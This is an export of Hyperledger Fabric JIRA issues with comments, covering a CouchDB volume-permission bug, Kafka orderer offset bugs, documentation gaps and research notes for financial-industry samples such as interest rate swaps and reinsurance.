CouchDB image fails to start with host mounted volume,FAB-5700,20087,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,mastersingh24,rhegde,rhegde,10/Aug/17 7:15 AM,03/Jan/19 11:46 PM,28/Oct/23 3:00 AM,01/Oct/17 8:04 PM,v1.0.2,,,v1.0.3,v1.1.0,fabric-ledger,,,,,,0,,,,,,,"Following is the documented approach for data persistence

[https://hyperledger-fabric.readthedocs.io/en/latest/build_network.html#a-note-on-data-persistence]

Couch DB fails to stand-up when the above method is followed on Host Machine running on Ubuntu 14.04 and RHELv7.2

This was discussed with [~mastersingh24] on RC and it was noticed the folder created by the docker doesn't have required permission and hence the problem at the time of writing by couch db.

Creating a folder and assigning o+w  permission and then running couch db with above steps - works well. But this is not going to be well accepted by Security.

Gari mentioned on working on a fix so this issue is resolved. Creating a JIRA for tracking purpose.

 

 ",,BhaveshPatadiya,david_dornseifer,eetti,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4905,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyclj:",,,,,,,,,,,,,,,,,,,,,,,BhaveshPatadiya,david_dornseifer,eetti,mastersingh24,rhegde,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Sep/17 5:09 AM;eetti;The docker container starts with the user *couchdb.* So when when you try to share the volume for the data directory, the docker container tries to create this folder and assign ownership to root. So I think the user variable should be left blank in the dockerfile instead of specifying it as *couchdb*. My environment is RHEL release 7.3 (Maipo). To fix this I started the container with the following commands and specified the user as root
{code:java}
docker run --rm -itd --name couchdb0 --user root \
--publish 5984:5984 \
--volume /var/hyperledger/couchdb0:/opt/couchdb/data \
hyperledger/fabric-couchdb:x86_64-1.0.0
{code}
 ;;;","30/Sep/17 6:36 PM;mastersingh24;https://gerrit.hyperledger.org/r/14003
https://gerrit.hyperledger.org/r/14005;;;","06/Nov/18 3:40 PM;BhaveshPatadiya;This issue is occurring again in couchdb latest version 0.4.14;;;","03/Jan/19 11:46 PM;david_dornseifer;Created new issue for 0.4.14 bug https://jira.hyperledger.org/browse/FAB-13475;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow user to add USER-DEFINED Environment Variables in Chaincode Container before deployment,FAB-5701,20088,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,chawlanikhil24,chawlanikhil24,10/Aug/17 2:54 PM,23/Jan/20 6:59 AM,28/Oct/23 3:00 AM,23/Jan/20 6:59 AM,v1.0.0,v1.0.1,v1.0.2,,,,,,,,,0,stale-item,,,,,,"This is one of the major concerns, since , to make the project customization according to the need of the user. For example, I am deploying Fabric-1.0 over K8s, but there are few things like IP-Addresses of all Pods are needed as environment variables for the chaincode container. I have to hardcode somethings which is not a preferable way . ",,chawlanikhil24,mastersingh24,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzyclr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,chawlanikhil24,mastersingh24,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Sep/17 9:40 PM;mastersingh24;This is not technically a bug so marking as an improvement;;;","06/Sep/17 2:15 PM;chawlanikhil24;Yupp!. Agree with the improvement, but I suggest, you must mark it high on the priority so that other platforms such as Kubernetes could support.;;;","23/Jan/20 6:59 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
PTE won't finish sometime when invoke to more than 1 org per org in a single trx,FAB-5702,20089,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wsh_bob,wsh_bob,wsh_bob,10/Aug/17 3:15 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,10/Aug/17 3:38 PM,,,,,,fabric-quality,,,,,,0,,,,,,,evtRcv has been double counted in an org scope,,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzyclz:",,,,,,,,,,,,,,,,,,,,,,,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Transaction retrieval based on organization/client,FAB-5703,20092,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jarvis26,jarvis26,10/Aug/17 6:42 PM,23/Jan/20 7:00 AM,28/Oct/23 3:00 AM,23/Jan/20 7:00 AM,,,,Future,,fabric-ledger,,,,,,0,stale-item,,,,,,Transaction retrieval based on some index or metadata. This might be useful for the organizations to retrieve their transaction history instead of going through the entire chain.,,denyeart,jarvis26,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycm7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,denyeart,jarvis26,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Aug/17 8:53 PM;denyeart;[~jarvis26] The requirement is too broad.  Please specify exactly which APIs (and underlying indexes) you are looking for.  It sounds like you want an API to get transaction history by submitting organization and/or client?;;;","23/Jan/20 7:00 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update error calls that used fabric/common/errors to use vendored error package,FAB-5704,20093,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,10/Aug/17 8:41 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,15/Sep/17 3:41 AM,,,,v1.1.0,,fabric-peer,,,,,,0,,,,,,,FAB-5504 vendored a new package to use for error handling. This JIRA will be used to remove the calls to the Fabric error handling framework located at fabric/common/errors and replace them with calls to the new errors package. ,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycmf:",,,,,,,,,,,,,,,,,,,,,,,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Event consumer should allow registration/callbacks for chaincode/txid events,FAB-5705,20095,,Story,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,glindsell,pmullaney,pmullaney,10/Aug/17 9:40 PM,23/Jan/20 7:00 AM,28/Oct/23 3:00 AM,23/Jan/20 7:00 AM,v1.1.0,,,,,fabric-peer,,,,,,0,stale-item,,,,,,All event types (chaincode/txid etc) should be derived from the block event by unmarshalling the block contents and calling back interested registrants. Event consumer should support this model and the tests based on it should be changed to reflect the new model.,,glindsell,pmullaney,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycmn:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,glindsell,pmullaney,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/Oct/17 3:37 AM;glindsell;https://gerrit.hyperledger.org/r/#/c/14087/;;;","23/Jan/20 7:00 AM;sykesm;Stale;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation reference byfn.sh script but no mention of where to get it,FAB-5706,20097,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,paul.sitoh,paul.sitoh,10/Aug/17 10:03 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,27/Oct/17 1:20 AM,,,,,,fabric-docs,,,,,,0,,,,,,,"Please refer to this page [https://hyperledger-fabric.readthedocs.io/en/latest/build_network.html#install-prerequisites]

In the section ""want to run it now?"" it mentions the script 'byfn.sh' but no reference to where I can get it.",,markparz,paul.sitoh,wl6g11li,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycn3:",,,,,,,,,,,,,,,,,,,,,,,markparz,paul.sitoh,wl6g11li,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"07/Sep/17 12:00 PM;wl6g11li;If you finish the section of *Install prerequisites*, you can find this file in the *fabric-samples\first-network* file.;;;","27/Oct/17 1:20 AM;markparz;Yes, this was resolved with adding the cd first-network as mentioned ^^^above^^^ going to close this out.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"BYFN tutorial, clarify that multiple channels can be added",FAB-5708,20100,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ChristopherFerris,ChristopherFerris,10/Aug/17 10:49 PM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,23/Mar/18 7:05 AM,v1.0.0,,,,,fabric-docs,,,,,,0,,,,,,,Add a clarification that additional channels can be configured by repeating the steps in the building your first network tutorial.,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycnr:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Aug/17 1:33 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/c/12323/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LastOffsetPersisted is off by 1 in a corner case,FAB-5709,20101,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,10/Aug/17 11:52 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 11:11 PM,v1.0.1,,,v1.0.2,v1.1.0,fabric-orderer,,,,,,0,kafka,,,,,,"{{LastOffsetPersisted}} is calculated with formula:
{code:java}
// If more than one batch is produced, exactly 2 batches are produced.
// The receivedOffset for the first batch is one less than the supplied
// offset to this function.
offset := receivedOffset - int64(len(batches)-i-1)
{code}
This is not alway correct. Consider following case:
- there are 2 tx in {{blockcutter.receiver}}'s {{pendingBatch}}, {{MaxMessageCount}} is 5
- total size of these 2 tx is _8KB_, {{PreferredMaxBytes}} is _10KB_
- now, a new tx comes in, whose {{receivedOffset}} is *x+1*, size is _5KB_
- {{Ordered}} cuts {{pendingBatch}} into *one* batch because of size overflow. Latest tx, however, is enqueued into {{pendingBatch}}
- according to the formula aforementioned, {{LastOffsetPersisted = receivedOffset - int64(len(batches)-i-1) = (x+1) - (1-0-1) = x+1}}, however the actual {{LastOffsetPersisted}} should be *x*. It ends up being off by 1

So, we need to precisely determine *if the newest tx is encapsulated into current batch or not*, in order to infer correct {{LastOffsetPersisted}}",,guoger,kchristidis,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycnz:",,,,,,,,,,,,,,,,,,,,,,,guoger,kchristidis,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Aug/17 8:39 AM;kchristidis;[~guoger]: Thanks for reporting this, great catch.

We could inspect the last envelope in the last slice of envelopes returned by the blockcutter during the Orderer call and compare it to the just-processed transaction but that would be too expensive.

A better way to address this is to modify the blockcutter.Orderer signature so that it returns one additional boolean, indicating whether there is a non-empty pending batch or not. I am skeptical however because this change is a bit more drastic than I'd like it to be.

Is there an easier, less expensive, more obvious fix that I'm missing?

Also note that no matter how we end up fixing this, we need to backport the fix to 1.0.x as well.;;;","11/Aug/17 11:15 AM;guoger;[~kchristidis] Option 2 is what I thought about too, I don't know any less invasive solution...;;;","11/Aug/17 4:43 PM;guoger;https://gerrit.hyperledger.org/r/#/c/12349/ against master branch
https://gerrit.hyperledger.org/r/#/c/12355/ against release branch

cc [~mastersingh24]: I believe this bug affects v1.0.1 and needs to be backported. Please take a look, thank you!;;;","11/Aug/17 7:58 PM;mastersingh24;Added 1.0.2 as fix version as well;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix missing policy warnings,FAB-5710,20102,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,10/Aug/17 11:56 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 10:29 PM,,,,,,,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyco7:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LastOffsetPersisted should be inserted to block in config update path,FAB-5711,20103,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,guoger,guoger,guoger,11/Aug/17 12:00 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 11:11 PM,v1.0.1,,,v1.1.0,,fabric-orderer,,,,,,0,kafka,,,,,,"{code:java}
case msgprocessor.ConfigUpdateMsg:
	_, err := support.ProcessNormalMsg(env)
	if err != nil {
		logger.Warningf(""[channel: %s] Discarding bad config message: %s"", support.ChainID(), err)
		break
	}

	batch := support.BlockCutter().Cut()
	if batch != nil {
		block := support.CreateNextBlock(batch)
		support.WriteBlock(block, nil)
	}
	block := support.CreateNextBlock([]*cb.Envelope{env})
	support.WriteConfigBlock(block, nil)
	*timer = nil
{code}
In current implementation of config processing path, {{LastOffsetPersisted}} is not inserted into newly created block, neither is {{lastCutBlockNumber}} incremented by 1.",,guoger,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycof:",,,,,,,,,,,,,,,,,,,,,,,guoger,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"11/Aug/17 8:44 AM;kchristidis;https://gerrit.hyperledger.org/r/#/c/12309/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve code coverage of common/config/channel,FAB-5712,20105,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,11/Aug/17 12:10 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,22/Aug/17 4:29 AM,,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycon:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
newIdentity outputs gibberish to log,FAB-5713,20106,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,11/Aug/17 12:21 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,12/Aug/17 10:39 PM,v1.0.2,,,v1.0.2,v1.1.0,fabric-crypto,,,,,,0,,,,,,,"When the peer 's msp is in DEBUG it outputs the following:
{code}
2017-08-10 14:02:37.226 UTC [msp/identity] newIdentity -> DEBU 02f Creating identity instance for cert &{0�^B^Y0�^A��^C^B^A^B^B^P^\�u*��<U+05FD>Q,b�K�4 0
^F^H*�H�=^D^C^B0s1^K0   ^F^CU^D^F^S^BUS1^S0^Q^F^CU^D^H^S
California1^V0^T^F^CU^D^G^S^MSan Francisco1^Y0^W^F^CU^D
^S^Porg1.example.com1^\0^Z^F^CU^D^C^S^Sca.org1.example.com0^^^W^M170810140234Z^W^M270808140234Z0[1^K0   ^F^CU^D^F^S^BUS1^S0^Q^F^CU^D^H^S
California1^V0^T^F^CU^D^G^S^MSan Francisco1^_0^]^F^CU^D^C^S^Vpeer0.org1.example.com0Y0^S^F^G*�H�=^B^A^F^H*�H�=^C^A^G^CB^@^DT��^?�2���_^R���^G^HVD�M�-��3R�n�^P~l�i��DA^F����T1fx蠽�i�R�`�moGK^D2��M0K0^N^F^CU
^]^O^A^A�^D^D^C^B^G�0^L^F^CU^]^S^A^A�^D^B0^@0+^F^CU^]#^D$0""� m5���$'�2YVh��{^E�^G
^�4^Pn$^U)c�z^L^M0
^F^H*�H�=^D^C^B^CH^@0E^B!^@����X��]�^C�j^Z^TLm��f�y^F{(i��ݭ$��^B iaDI��Y1N��p��1��-��5ѱ)���^CPr 0�^A��^C^B^A^B^B^P^\�u*��<U+05FD>Q,b�K�4 0
^F^H*�H�=^D^C^B0s1^K0   ^F^CU^D^F^S^BUS1^S0^Q^F^CU^D^H^S
California1^V0^T^F^CU^D^G^S^MSan Francisco1^Y0^W^F^CU^D
^S^Porg1.example.com1^\0^Z^F^CU^D^C^S^Sca.org1.example.com0^^^W^M170810140234Z^W^M270808140234Z0[1^K0   ^F^CU^D^F^S^BUS1^S0^Q^F^CU^D^H^S
California1^V0^T^F^CU^D^G^S^MSan Francisco1^_0^]^F^CU^D^C^S^Vpeer0.org1.example.com0Y0^S^F^G*�H�=^B^A^F^H*�H�=^C^A^G^CB^@^DT��^?�2���_^R���^G^HVD�M�-��3R�n�^P~l�i��DA^F����T1fx蠽�i�R�`�moGK^D2��M0K0^N^F^CU^]^O^A^A�^D^D^C^B^G�0^L^F^CU^]^S^A^A�^D^B0^@0+^F^CU^]#^D$0""� m5���$'�2YVh��{^E�^G
^�4^Pn$^U)c�z^L^M 0Y0^S^F^G*�H�=^B^A^F^H*�H�=^C^A^G^CB^@^DT��^?�2���_^R���^G^HVD�M�-��3R�n�^P~l�i��DA^F����T1fx蠽�i�R�`�moGK^D2� 0[1^K0 ^F^CU^D^F^S^BUS1^S0^Q^F^CU^D^H^S
California1^V0^T^F^CU^D^G^S^MSan Francisco1^_0^]^F^CU^D^C^S^Vpeer0.org1.example.com 0s1^K0      ^F^CU^D^F^S^BUS1^S0^Q^F^CU^D^H^S
California1^V0^T^F^CU^D^G^S^MSan Francisco1^Y0^W^F^CU^D
^S^Porg1.example.com1^\0^Z^F^CU^D^C^S^Sca.org1.example.com 0E^B!^@����X��]�^C�j^Z^TLm��f�y^F{(i��ݭ$��^B iaDI��Y1N��p��1��-��5ѱ)���^CPr ECDSA-SHA256 %!s(x509.PublicKeyAlgorithm=3) %!s(*ecdsa.PublicKey=&{{0xc4200147c0} 0xc42033e540 0xc42033e560}) %!s(int=3) 38300758076570420811073574975538672672 {[US] [org1.example.com] [] [San Francisco] [California] [] []  ca.org1.example.com [{2.5.4.6 US} {2.5.4.8 California} {2.5.4.7 San Francisco} {2.5.4.10 org1.example.com} {2.5.4.3 ca.org1.example.com}] []} {[US] [] [] [San Francisco] [California] [] []  peer0.org1.example.com [{2.5.4.6 US} {2.5.4.8 California} {2.5.4.7 San Francisco} {2.5.4.3 peer0.org1.example.com}] []} 2017-08-10 14:02:34 +0000 UTC 2027-08-08 14:02:34 +0000 UTC %!s(x509.KeyUsage=1) [{2.5.29.15 %!s(bool=true) ^C^B^G�} {2.5.29.19 %!s(bool=true) 0^@} {2.5.29.35 %!s(bool=false) 0""� m5���$'�2YVh��{^E�^G

{code}",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycov:",,,,,,,,,,,,,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Financial Industry samples,FAB-5714,20107,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,jimthematrix,jimthematrix,11/Aug/17 1:40 AM,23/Jan/20 7:00 AM,28/Oct/23 3:00 AM,23/Jan/20 7:00 AM,,,,Future,,fabric-samples,,,,,,0,Release-planning-1.1,stale-item,,,,,"Fabric at the moment have a deficit in samples for the financial industry. work is needed to study how Fabric may be used in financial markets for different types of assets and securities.

Some of the scenarios in consideration:
 * Fixed income assets: Commercial paper
 * Equity assets: private equity
 * Derivatives: Interest Rate Swap

h1. Design Details
h2. Interest Rate Swap (IRS)

Company A and B sets up an IRS contract with the following terms:
{quote}(Source: [https://academlib.com/14298/economics/pricing_interest_rate_swap])
 Party A and Party B agree to exchange an interest rate that varies from period to period, specifically 3-month LIBOR (hence, it's the “floating” rate), for a fixed rate of 3.40% on a quarterly basis for two years. Net settlement payments are in arrears, meaning 3-month LIBOR is determined at the beginning of the period and then a payment for the rate difference, times the _*notional principal*_, times the fraction of the year, is made at the end of the period. Importantly, there is no exchange of principal at initiation or at maturity. That's why the principal is merely “notional” – it's the scale factor for the transaction. In this case, the notional principle is set at $60 million.

!https://academlib.com/imag/econom/smith_bondm/image303.jpg!

*FIGURE* Two-Year, Quarterly Net Settlement, Interest Rate Swap 3.40% Fixed versus 3-Month LIBOR
{quote}
The entire lifecycle of the trade will be executed with the following transactions:
 - the general terms of the IRS contracts are modeled by chaincode (written with Hyperledger Composer)
 - admins of A and B each install the chaincode on their peers
 - admins from either of A or B creates a channel dedicated to trading activities b/w the two parties, or selects one from an existing channel b/w A and B
 - admins from either A or B submits a transaction to instantiate the chaincode, which gets endorsed by peers from both parties and recorded in the channel's ledger, during the instantiation, the following specific terms of the IRS trade are configured:
 ** identity the payer of the fixed interest rate (Party A in the example above) and receiver (Party B)
 ** fixed interest rate is set to 3.4%
 ** notional principle amount is set to $60 million
 ** payment intervals are set to 3 months
 ** maturity is set to 2 years
 - at this point the trade has been executed and the terms are in effect
 - at each net settlement, which is the end of the month 3, 6, 9, 12, 15, 18, 21, 24, LIBOR rate is taken (from a standard oracle service, but in our case we'll simply call the LIBOR API and pass the historical timestamp for the rate). note that we don't use an oracle service because the LIBOR API is deterministic, the same rate already returned for the same historical timestamp
 - once the settlement is performed at month 24, the chaincode is marked as ""COMPLETED"" and will not perform any further settlements",,ajp,eacoeytaux,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycp3:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ajp,eacoeytaux,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Sep/17 3:03 AM;ajp;Three finance-sector industry samples are being researched for potential development:
 # Private equity (settling pink-sheet rates)
 # Commercial paper (peer-to-peer short term loans)
 # Reinsurance;;;","20/Sep/17 4:51 AM;ajp;*Private Equity*
 * [www.stockontheblock.com|http://www.stockontheblock.com/] – some sort of private equity firm that claims to run on blockchain
 * [https://bravenewcoin.com/news/guernsey-to-host-the-first-ever-private-equity-blockchain-deployment/] - IBM developed a private equity blockchain alongside Northern Trust on the island of Guernsey
 * Relation to pink sheets – pink sheets is the term used to refer to OTC (over-the-counter) stocks, meaning stocks that are not traded on a known and regulated exchange like the NYSE
 ** Private individuals or entities can invest in these stocks with little federal oversight or regulation
 ** High-risk, high-reward
 ** The big disadvantage is pink sheet companies do not need to file with the SEC or really abide by any of the financial reporting laws, so information about them is very hard to come by
 ** Blockchain could help add some transparency to the pink sheet system
 ** There also exists the OTCBB (over-the-counter bulletin board) which is owned by NASDAQ and lists OTC stocks (pink sheets are technically a privately held company)
 ** Blockchain could potentially act as a public, more transparent replacement to the pink sheet/OTCBB system
 ** Several technologies already exist that seek to integrate blockchain into OTC stocks:
 *** [https://www.coindesk.com/nasdaq-inks-blockchain-trading-deal-swiss-stock-exchange/]
 *** [http://www.businesswire.com/news/home/20161116005521/en/Korea-Exchange-Opens-KRX-Startup-Market-Exchange]

 

Conclusion:

The applicability of blockchain to the private equity market is extremely broad and uncertain. It's hard to justify simply replacing existing methods of buying/selling private equity if the solution doesn't also bring an additional level of transparency or trust. That level is difficult to define and will vary depending on the type of private equity being discussed. For example, when it comes to OTC stocks, what does a blockchain bring? Companies can still choose not to share any information, or if the blockchain enforces some sort of reporting system, can choose to entirely fabricate this information. How would you correlate the value of a stock on the blockchain to a real-world value? Would we have to integrate a cryptocurrency in Fabric?

The only perceivable advantage of the blockchain would be to eliminate the middle-men (pink sheet, OTCBB) which manage the trading of OTC stocks. But then who runs the network and who owns the peers? Perhaps every company who wishes to participate would have to run a peer or in some way be part of the OTC blockchain network to be able to sell their stock, but then there would conversely have to be an extremely easy way for end-user investors to buy this stock, and this would inevitably lead to the creation of a middle-man market which continues scamming users.;;;","21/Sep/17 12:39 AM;ajp;*Reinsurance*
 * Insurance companies insuring their insurance policies with other insurance companies
 * Allows risk to be spread out across multiple insurance companies even if one company writes most of the policies in a geographical area
 ** Keeps them from going bankrupt and defaulting on their policies if a major catastrophe affects many people
 * Allows insurance companies to put out more policies than they actually have money for, so they can grow their business without requiring the full amount of liquidity required to pay out all policies
 ** For example, if an insurance company has $100 million to insure people, they can write a treaty reinsurance with one or more reinsurers where the reinsurers agree to take on 75% of the value of the insurer's policies
 ** So the reinsurers get 75% of the premium and 75% of the risk
 ** The insurance company can now put out $400 million worth of policies while only being responsible for $100 million of those $400 million
 * Reinsurance policies can be written between an insurer and a company that only does reinsurance, or from insurer to insurer
 * There are several different types of reinsurance contracts
 ** Facultative reinsurance is reinsurance on a specific policy, these are dealt on a case-by-case basis and require an underwriter to assess the risk and value of the policy that's being insured
 ** Facultative reinsurance is typically purchased by the underwriter who wrote the original policy
 ** Facultative reinsurance is typically taken out for unusual policies or non-standard risk
 ** Treaty reinsurance is when a reinsurer agrees to take-on a specific portion of a whole class of policies
 ** Treaty reinsurance has several sub-types, primarily proportional and non-proportional
 *** Proportional treaty reinsurance has the reinsurer agree to take on a percentage of every policy in the contract, i.e. reinsurer receives 50% of premium and takes on 50% of risk
 *** Non-proportional treaty reinsurance specifies a specific dollar amount which the reinsurer is responsible for, for a specific time period
 *** An insurance may accept $10 million of risk up-front and take a non-proportional treaty reinsurance contract for $10 million in excess of this
 *** If in the specified the company must pay out more than $10 million, the difference gets paid out by the reinsurer up to another $10 million
 *** Any amount in excess of the $20 million will have to be paid out by the insurer
 ** Treaty reinsurance is typically purchased by high-level execs of an insurance company
 * Blockchain reinsurance white paper: [https://www.pwc.com/gx/en/financial-services/publications/assets/blockchain-for-reinsurers.pdf]

 

